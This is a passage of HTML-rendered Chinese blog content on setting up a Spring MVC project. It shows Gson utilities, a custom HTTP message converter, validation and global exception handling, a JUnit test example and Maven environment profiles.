class=\"params\">()</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> gson;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> Gson <span class=\"title function_\">createGsonFormat</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> gsonFormat;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> &lt;T&gt; String <span class=\"title function_\">toJson</span><span class=\"params\">(T t)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> gson.toJson(t);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> &lt;T&gt; String <span class=\"title function_\">toJsonFormat</span><span class=\"params\">(T t)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> gsonFormat.toJson(t);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> &lt;T&gt; T <span class=\"title function_\">fromJson</span><span class=\"params\">(String json, Class&lt;T&gt; clazzT)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> gson.fromJson(json, clazzT);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> &lt;T&gt; T <span class=\"title function_\">fromJson</span><span class=\"params\">(String json , Type type)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> gson.fromJson(json, type);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> &lt;T&gt; T <span class=\"title function_\">fromJsonFormat</span><span class=\"params\">(String json, Class&lt;T&gt; clazzT)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> gsonFormat.fromJson(json, clazzT);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> &lt;T&gt; T <span class=\"title function_\">fromJsonFormat</span><span class=\"params\">(String json, Type type)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> gsonFormat.fromJson(json, type);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>添加统一vo，ResponseBodyVo</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">ResponseBodyVo</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> Integer code;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> String msg;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> Object data;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">ResponseBodyVo</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">ResponseBodyVo</span><span class=\"params\">(Integer code, String msg, Object data)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.code = code;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.msg = msg;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.data = data;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> Integer <span class=\"title function_\">getCode</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> code;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">setCode</span><span class=\"params\">(Integer code)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.code = code;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> String <span class=\"title function_\">getMsg</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> msg;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">setMsg</span><span class=\"params\">(String msg)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.msg = msg;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> Object <span class=\"title function_\">getData</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> data;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">setData</span><span class=\"params\">(Object data)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.data = data;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>自定义消息转换器GsonHttpMessageConverter基础抽象类AbstractHttpMessageConverter实现接口GenericHttpMessageConverter</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">GsonHttpMessageConverter</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">AbstractHttpMessageConverter</span>&lt;Object&gt; <span class=\"keyword\">implements</span> <span class=\"title class_\">GenericHttpMessageConverter</span>&lt;Object&gt; &#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"type\">Charset</span> <span class=\"variable\">DEFAULT_CHARSET</span> <span class=\"operator\">=</span> Charset.forName(<span class=\"string\">&quot;UTF-8&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"type\">boolean</span> <span class=\"title function_\">supports</span><span class=\"params\">(Class&lt;?&gt; clazz)</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">protected</span> Object <span class=\"title function_\">readInternal</span><span class=\"params\">(Class&lt;?&gt; clazz, HttpInputMessage inputMessage)</span> <span class=\"keyword\">throws</span> IOException, HttpMessageNotReadableException &#123;</span><br><span class=\"line\">        <span class=\"type\">String</span> <span class=\"variable\">requestBody</span> <span class=\"operator\">=</span> StreamUtils.copyToString(inputMessage.getBody(), DEFAULT_CHARSET);</span><br><span class=\"line\">        <span class=\"type\">String</span> <span class=\"variable\">paramsData</span> <span class=\"operator\">=</span> URLDecoder.decode(requestBody.replace(<span class=\"string\">&quot;params=&quot;</span>, <span class=\"string\">&quot;&quot;</span>), <span class=\"string\">&quot;utf-8&quot;</span>);</span><br><span class=\"line\">        <span class=\"type\">Object</span> <span class=\"variable\">requestVo</span> <span class=\"operator\">=</span> GsonUtils.fromJson(paramsData, TypeToken.get(clazz).getType());</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (clazz.isArray()) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"title class_\">HttpMessageNotReadableException</span>(<span class=\"string\">&quot;不支持集合泛型: &quot;</span>);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (requestVo <span class=\"keyword\">instanceof</span> Collection) &#123;</span><br><span class=\"line\">            Collection&lt;?&gt; requests = (Collection&lt;?&gt;) requestVo;</span><br><span class=\"line\">            ValidationUtils.validate(requests, requests.size());</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            ValidationUtils.validate(requestVo);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> requestVo;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"keyword\">void</span> <span class=\"title function_\">writeInternal</span><span class=\"params\">(Object o, HttpOutputMessage outputMessage)</span> <span class=\"keyword\">throws</span> IOException, HttpMessageNotWritableException &#123;</span><br><span class=\"line\">        ResponseBodyVo responseBodyVo;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (o <span class=\"keyword\">instanceof</span> ResponseBodyVo) &#123;</span><br><span class=\"line\">            responseBodyVo = (ResponseBodyVo) o;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            responseBodyVo = <span class=\"keyword\">new</span> <span class=\"title class_\">ResponseBodyVo</span>(<span class=\"number\">200</span>, <span class=\"string\">&quot;success&quot;</span>, o);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        outputMessage.getBody().write(GsonUtils.toJson(responseBodyVo).getBytes());</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"type\">boolean</span> <span class=\"title function_\">canRead</span><span class=\"params\">(Type type, Class&lt;?&gt; contextClass, MediaType mediaType)</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> Object <span class=\"title function_\">read</span><span class=\"params\">(Type type, Class&lt;?&gt; contextClass, HttpInputMessage inputMessage)</span> <span class=\"keyword\">throws</span> IOException, HttpMessageNotReadableException &#123;</span><br><span class=\"line\">        <span class=\"type\">String</span> <span class=\"variable\">requestBody</span> <span class=\"operator\">=</span> StreamUtils.copyToString(inputMessage.getBody(), DEFAULT_CHARSET);</span><br><span class=\"line\">        <span class=\"type\">String</span> <span class=\"variable\">paramsData</span> <span class=\"operator\">=</span> URLDecoder.decode(requestBody.replace(<span class=\"string\">&quot;params=&quot;</span>, <span class=\"string\">&quot;&quot;</span>), <span class=\"string\">&quot;utf-8&quot;</span>);</span><br><span class=\"line\">        <span class=\"type\">Object</span> <span class=\"variable\">requestVo</span> <span class=\"operator\">=</span> GsonUtils.fromJson(paramsData, TypeToken.get(type).getType());</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (requestVo <span class=\"keyword\">instanceof</span> Object[])&#123;</span><br><span class=\"line\">            Object[] requests = (Object[]) requestVo;</span><br><span class=\"line\">            ValidationUtils.validate(requests, requests.length);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (requestVo <span class=\"keyword\">instanceof</span> Collection) &#123;</span><br><span class=\"line\">            Collection&lt;?&gt; requests = (Collection&lt;?&gt;) requestVo;</span><br><span class=\"line\">            ValidationUtils.validate(requests, requests.size());</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            ValidationUtils.validate(requestVo);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> requestVo;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"type\">boolean</span> <span class=\"title function_\">canWrite</span><span class=\"params\">(Type type, Class&lt;?&gt; clazz, MediaType mediaType)</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">write</span><span class=\"params\">(Object o, Type type, MediaType contentType, HttpOutputMessage outputMessage)</span> <span class=\"keyword\">throws</span> IOException, HttpMessageNotWritableException &#123;</span><br><span class=\"line\">        ResponseBodyVo responseBodyVo;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (o <span class=\"keyword\">instanceof</span> ResponseBodyVo) &#123;</span><br><span class=\"line\">            responseBodyVo = (ResponseBodyVo) o;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            responseBodyVo = <span class=\"keyword\">new</span> <span class=\"title class_\">ResponseBodyVo</span>(<span class=\"number\">200</span>, <span class=\"string\">&quot;success&quot;</span>, o);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        outputMessage.getBody().write(GsonUtils.toJson(responseBodyVo).getBytes());</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>添加测试Controller</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@RequestMapping(&quot;api&quot;)</span></span><br><span class=\"line\"><span class=\"meta\">@RestController</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">ApiController</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@RequestMapping(&quot;list&quot;)</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> List&lt;DemoVo&gt; <span class=\"title function_\">list</span><span class=\"params\">(<span class=\"meta\">@RequestBody</span> SearchDemoVo[] searchDemoVo)</span>&#123;</span><br><span class=\"line\">        List&lt;DemoVo&gt;list = <span class=\"keyword\">new</span> <span class=\"title class_\">ArrayList</span>&lt;&gt;();</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"type\">int</span> <span class=\"variable\">i</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>; i &lt; <span class=\"number\">5</span>; i++) &#123;</span><br><span class=\"line\">            <span class=\"type\">DemoVo</span> <span class=\"variable\">demoVo</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">DemoVo</span>();</span><br><span class=\"line\">            demoVo.setName(String.valueOf(i));</span><br><span class=\"line\">            list.add(demoVo);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> list;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>在使用消息转换器的时候，需要注意的是，入参采用@RequestBody注解，出参数采用@ResponseBody注解。才可以使用消息转换器。<br>在spring-servlet.xml中添加自定义消息转换器。</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">bean</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;com.feiniu.http.converter.GsonHttpMessageConverter&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">property</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;supportedMediaTypes&quot;</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">list</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">value</span>&gt;</span>text/html;charset=UTF-8<span class=\"tag\">&lt;/<span class=\"name\">value</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">value</span>&gt;</span>application/json<span class=\"tag\">&lt;/<span class=\"name\">value</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">value</span>&gt;</span>application/x-www-form-urlencoded<span class=\"tag\">&lt;/<span class=\"name\">value</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">list</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">property</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"全局异常处理、入参数校验\"><a href=\"#全局异常处理、入参数校验\" class=\"headerlink\" title=\"全局异常处理、入参数校验\"></a>全局异常处理、入参数校验</h3><p>在开发过程中，一般需要统一处理相关异常，避免内部异常暴露在外。需要统一处理异常以及消息校验。<br>添加依赖hibernate-validator校验<br>步骤：</p>\n<ol>\n<li>添加依赖</li>\n<li>添加校验Util</li>\n<li>添加异常全局处理</li>\n<li>消息转换器添加异常返回</li>\n</ol>\n<p>操作：<br>pom文件添加依赖<br>添加校验Util</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">ValidationUtils</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"type\">Validator</span> <span class=\"variable\">validator</span> <span class=\"operator\">=</span> Validation.buildDefaultValidatorFactory().getValidator();</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> &lt;T&gt;  <span class=\"keyword\">void</span> <span class=\"title function_\">validate</span><span class=\"params\">(T t)</span> <span class=\"keyword\">throws</span> ValidationException &#123;</span><br><span class=\"line\">        Set&lt;ConstraintViolation&lt;T&gt;&gt; set =  validator.validate(t);</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(set.size()&gt;<span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">            <span class=\"type\">StringBuilder</span> <span class=\"variable\">validateError</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">StringBuilder</span>();</span><br><span class=\"line\">            <span class=\"keyword\">for</span>(ConstraintViolation&lt;T&gt; val : set)&#123;</span><br><span class=\"line\">                validateError.append(val.getMessage()).append(<span class=\"string\">&quot;;&quot;</span>);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ValidationException</span>(validateError.toString());</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> &lt;T&gt;  <span class=\"keyword\">void</span> <span class=\"title function_\">validate</span><span class=\"params\">(Collection&lt;T&gt;ts, <span class=\"type\">int</span> size)</span> <span class=\"keyword\">throws</span> ValidationException &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (ts == <span class=\"literal\">null</span> || ts.isEmpty())&#123;</span><br><span class=\"line\">            <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"title class_\">IllegalArgumentException</span>(<span class=\"string\">&quot;参数为空&quot;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (ts.size() &gt; size)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"title class_\">IllegalArgumentException</span>(<span class=\"string\">&quot;超出最大查询数量:&quot;</span> + size);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (T t : ts) &#123;</span><br><span class=\"line\">            validate(t);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>添加异常处理</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@ControllerAdvice(basePackages = &quot;com.feiniu.controller.api&quot;)</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">ApiControllerAdvice</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@ExceptionHandler(Exception.class)</span></span><br><span class=\"line\">    <span class=\"meta\">@ResponseBody</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> ResponseBodyVo <span class=\"title function_\">handleGlobalException</span><span class=\"params\">(HttpServletRequest request, Exception ex)</span>&#123;</span><br><span class=\"line\">        ex.printStackTrace();</span><br><span class=\"line\">        ResponseBodyVo responseBodyVo ;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (ex <span class=\"keyword\">instanceof</span> ValidationException)&#123;</span><br><span class=\"line\">            responseBodyVo = <span class=\"keyword\">new</span> <span class=\"title class_\">ResponseBodyVo</span>(<span class=\"number\">500</span>, <span class=\"string\">&quot;参数异常&quot;</span>, ex.getMessage());</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            responseBodyVo = <span class=\"keyword\">new</span> <span class=\"title class_\">ResponseBodyVo</span>(<span class=\"number\">500</span>, <span class=\"string\">&quot;系统错误&quot;</span>, <span class=\"string\">&quot;后台数据异常&quot;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> responseBodyVo;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>修改消息转换器，添加入参验证，出参数处理。<br>验证消息转换器是否正常。注意验证集合、数组、泛型、对象等。</p>\n<ul>\n<li>在使用消息转换器的时候，如果不做特别判断，默认会处理所有的消息，有时候项目中包含API和后台模块，会导致后台ajax请求也会封装参数，所以在消息转换的时候判断是否需要转换消息。</li>\n</ul>\n<h3 id=\"本地Junit测试\"><a href=\"#本地Junit测试\" class=\"headerlink\" title=\"本地Junit测试\"></a>本地Junit测试</h3><p>在一般功能模块开发完成后，需要在本地进行测试，可以采用spring-test加Junit测试<br>在pom文件中添加spring-test和Junit相关依赖，设置scope为test。<br>举例创建测试文件DemoServiceTest测试DemoService</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@RunWith(SpringJUnit4ClassRunner.class)</span></span><br><span class=\"line\"><span class=\"meta\">@ContextConfiguration(locations = &quot;classpath*:applicationContext.xml&quot;)</span></span><br><span class=\"line\"><span class=\"meta\">@WebAppConfiguration</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">DemoServiceTest</span> &#123;</span><br><span class=\"line\">    <span class=\"meta\">@Autowired</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> DemoService demoService;</span><br><span class=\"line\">    <span class=\"meta\">@Test</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">dbCount</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"type\">int</span> <span class=\"variable\">i</span> <span class=\"operator\">=</span> demoService.dbCount();</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;```````````&quot;</span> + i);</span><br><span class=\"line\">        <span class=\"keyword\">assert</span> i != <span class=\"number\">0</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Test</span></span><br><span class=\"line\">    <span class=\"meta\">@Rollback</span></span><br><span class=\"line\">    <span class=\"meta\">@Transactional</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">insertDemo</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"type\">int</span> <span class=\"variable\">i</span> <span class=\"operator\">=</span> demoService.insertDemo();</span><br><span class=\"line\">        <span class=\"keyword\">assert</span> i == <span class=\"number\">1</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"分环境打包项目\"><a href=\"#分环境打包项目\" class=\"headerlink\" title=\"分环境打包项目\"></a>分环境打包项目</h3><p>在项目启动后一般需要区分不同的环境，比如local、dev、beta、preview、online，各个环境配置不一样，需要分开读取配置文件。<br>步骤：</p>\n<ol>\n<li>修改pom文件分环境</li>\n<li>修改启动配置文件</li>\n</ol>\n<p>操作：<br>pom根目录下添加</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">profiles</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">profile</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">activation</span>&gt;</span></span><br><span class=\"line\">          <span class=\"tag\">&lt;<span class=\"name\">activeByDefault</span>&gt;</span>true<span class=\"tag\">&lt;/<span class=\"name\">activeByDefault</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;/<span class=\"name\">activation</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">id</span>&gt;</span>default<span class=\"tag\">&lt;/<span class=\"name\">id</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">properties</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">config.path</span>&gt;</span>file:服务器路径<span class=\"tag\">&lt;/<span class=\"name\">config.path</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">properties</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">profile</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">profile</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">id</span>&gt;</span>local<span class=\"tag\">&lt;/<span class=\"name\">id</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">properties</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">config.path</span>&gt;</span>classpath:config/local<span class=\"tag\">&lt;/<span class=\"name\">config.path</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">properties</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">profile</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">profile</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">id</span>&gt;</span>dev<span class=\"tag\">&lt;/<span class=\"name\">id</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">properties</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">config.path</span>&gt;</span>classpath:config/dev<span class=\"tag\">&lt;/<span class=\"name\">config.path</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">properties</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">profile</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">profile</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">id</span>&gt;</span>beta<span class=\"tag\">&lt;/<span class=\"name\">id</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">properties</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">config.path</span>&gt;</span>classpath:config/beta<span class=\"tag\">&lt;/<span class=\"name\">config.path</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">properties</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">profile</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">profiles</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>在打包的指定环境即可选择需要的包</p>\n<p>在pom文件resources下添加</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">resource</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">filtering</span>&gt;</span>true<span class=\"tag\">&lt;/<span class=\"name\">filtering</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">directory</span>&gt;</span>src/main/resources<span class=\"tag\">&lt;/<span class=\"name\">directory</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">includes</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">include</span>&gt;</span>applicationContext-config.xml<span class=\"tag\">&lt;/<span class=\"name\">include</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">include</span>&gt;</span>checksrv.properties<span class=\"tag\">&lt;/<span class=\"name\">include</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">includes</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">resource</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">resource</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">filtering</span>&gt;</span>false<span class=\"tag\">&lt;/<span class=\"name\">filtering</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span 